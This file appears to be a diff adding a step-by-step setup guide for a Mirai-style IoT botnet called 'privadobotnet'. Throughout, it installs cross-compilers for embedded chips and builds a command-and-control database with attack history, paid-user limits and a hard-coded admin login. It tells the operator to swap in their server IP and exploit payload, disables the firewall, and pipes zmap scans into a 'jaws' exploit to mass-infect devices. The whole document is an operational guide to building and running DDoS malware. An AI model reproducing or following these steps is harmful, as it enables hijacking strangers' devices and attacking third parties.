@@ -1,0 +1,148 @@
+// Copy paste this code and put it all on your terminal all at once:
+
+yum update -y
+yum install epel-release -y
+yum groupinstall "Development Tools" -y
+yum install gmp-devel -y
+ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql* mariadb* dos2unix gcc glibc-static -y
+
+mkdir /etc/xcompile
+cd /etc/xcompile 
+
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-x86_64.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mips.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mipsel.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv4l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv5l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-sh4.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+
+tar -jxf cross-compiler-x86_64.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+
+rm -rf *.tar.bz2
+rm -rf *.tar.gz
+rm -rf *.tar.xz
+
+mv cross-compiler-x86_64 x86_64
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv7l armv7l
+mv cross-compiler-sh4 sh4
+mv cross-compiler-m68k m68k
+mv cross-compiler-sparc sparc
+
+cd /tmp
+rm -rf /usr/local/go 
+wget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz 
+sha256sum go1.14.2.linux-amd64.tar.gz 
+sudo tar -C /usr/local -xzf go1.14.2.linux-amd64.tar.gz 
+export PATH=$PATH:/usr/local/go/bin 
+source ~/.bash_profile 
+rm -rf go1.14.2.linux-amd64.tar.gz
+cd ~/
+
+ 
+====================================================================================
+
+change all '194.180.224.124' in the source by your server ip.
+change all '127,0,0,1' by your server ip (change . by ,)
+change 'your payload here' in the libdvr_exploit.go
+
+====================================================================================
+
+// We will setup the database, run these commands on your terminal:
+
+service mariadb start && mysql_secure_installation
+
+====================================================================================
+
+// Now Login with your mysql pass by running this command:
+
+mysql -u root -p
+
+====================================================================================
+
+// Now we will add the database, copy and paste this on your terminal:
+
+use mysql
+GRANT ALL ON *.* to root@'%' IDENTIFIED BY 'root';
+FLUSH PRIVILEGES;
+
+CREATE DATABASE privadobotnet;
+use privadobotnet;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+INSERT INTO users VALUES (NULL, 'sparta', 'elfamoso', 0, 0, 0, 0, -1, 1, 30, '');
+
+exit;
+
+====================================================================================
+
+// Now your database is complete, we will restart and disable services:
+
+service iptables stop && service httpd restart && service mysqld restart
+
+====================================================================================
+
+//Set ulimit
+
+nano /usr/include/bits/typesizes.h
+edit the 1024 to 999999
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+====================================================================================
+
+//UPLOAD ALL THE FILES AND COMPILE
+
+cd ~/ && chmod 0777 * -R && dos2unix build.sh && sh build.sh && python payload.py
+
+====================================================================================
+
+for use exploit:
+
+zmap -p 60001 | ./jaws (change the 127.0.0.1 in jaws.go by your server ip)
